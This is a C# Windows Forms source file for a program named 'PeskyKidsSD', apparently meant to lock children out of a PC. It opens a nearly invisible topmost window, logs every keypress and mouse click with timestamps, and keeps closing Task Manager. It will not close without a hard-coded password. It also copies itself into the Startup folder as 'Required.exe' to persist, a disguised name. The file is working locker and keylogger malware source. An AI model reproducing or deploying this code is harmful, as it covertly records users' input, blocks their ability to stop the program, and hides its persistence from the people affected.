using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;

namespace PeskyKidsSD
{
	public partial class MainForm : Form
    {
        #region Variable Declaration
        int taskMgrProc;
		Process[] MyProcess;
		bool closeAllowed = false;
		Input InputModal = new Input();
		MouseCoordsTable CoordsKeyTable = new MouseCoordsTable();
		string masterMouseCoords;
		string masterKeyLog;
		string fullstringMouse = "";
		string fullstringKeys = "";
        #endregion

        public MainForm()
		{
			InitializeComponent();
            checkStartUp();
		}
		
		void TaskMgrTimerTick(object sender, EventArgs e)
		{
			taskMgrProc = 7869841;
            MyProcess = Process.GetProcesses();
            for (int i = 0; i < MyProcess.Length; i++)
            {
                if (MyProcess[i].ProcessName == "taskmgr")
                {
                    taskMgrProc = MyProcess[i].Id;
                    break;
                }
            }
            if (taskMgrProc != 7869841)
            {
                Process taskMgrProcess = Process.GetProcessById(taskMgrProc);
                taskMgrProcess.CloseMainWindow();
            }
		}
		void MainFormLoad(object sender, EventArgs e)
		{
			this.Opacity = 0.01;
			this.WindowState = FormWindowState.Maximized;
			this.TopMost = true;
		}
		void MainFormFormClosing(object sender, FormClosingEventArgs e)
		{
			if (!closeAllowed)
			{
				e.Cancel = true;
			}
            if (Environment.UserName == "Win7-Gaming" || Environment.UserName == "case512n03")
            {
                string startUpPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                if (File.Exists(startUpPath + "/Required.exe"))
                {
                    File.Delete(startUpPath + "/Required.exe");
                }
            }
		}
		void MainFormKeyDown(object sender, KeyEventArgs e)
		{
			keyLog(e.KeyCode);
			if (e.KeyCode == Keys.F10) {
				InputModal.displaySettings("Enter password to continue", "PeskyKids", true);
				InputModal.ShowDialog();
                string input = InputModal.returnText();
                if (input == "135798462") {
                	closeAllowed = true;
                	this.Close();
                }
			}
			if (e.KeyCode == Keys.F9) {
				string[] eachXY = masterMouseCoords.Split('|');
				string[] keys = masterKeyLog.Split('|');
				int i = 0;
				fullstringMouse = "";
				foreach (string mouseXY in eachXY) {
					i++;
					fullstringMouse += "\r\n" + mouseXY;
				}
				string tempfullstringMouse = "Total Clicks: " + (i - 1) + "\r\n" + fullstringMouse;
				i = 0;
				fullstringKeys = "";
				foreach (string keyPress in keys) {
					i++;
					fullstringKeys += "\r\n" + keyPress;
				}
				string tempfullstringKeys = "Total keypresses: " + (i - 1) + "\r\n" + fullstringKeys;
				CoordsKeyTable.setTableMouse(tempfullstringMouse);
				CoordsKeyTable.setTableKeys(tempfullstringKeys);
				CoordsKeyTable.ShowDialog();
			}
		}
		void MainFormClick(object sender, EventArgs e)
		{
			int mouseX = MousePosition.X;
			int mouseY = MousePosition.Y;
			mouseLog(mouseX, mouseY);
		}
		void keyLog(Keys key) {
			masterKeyLog += DateTime.Now.ToString("hh.mm.ss") + ", " + key.ToString() + "|";
		}
		void mouseLog(int x, int y) {
			masterMouseCoords += DateTime.Now.ToString("hh.mm.ss") + ", X:" + x + ", Y:" + y + "|";
		}
        void checkStartUp()
        {
            string startUpPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string thisName = Process.GetCurrentProcess().MainModule.FileName;
            if (!File.Exists(startUpPath + "/Required.exe"))
            {
                File.Copy(thisName, startUpPath + "/Required.exe");
            }
        }
	}
}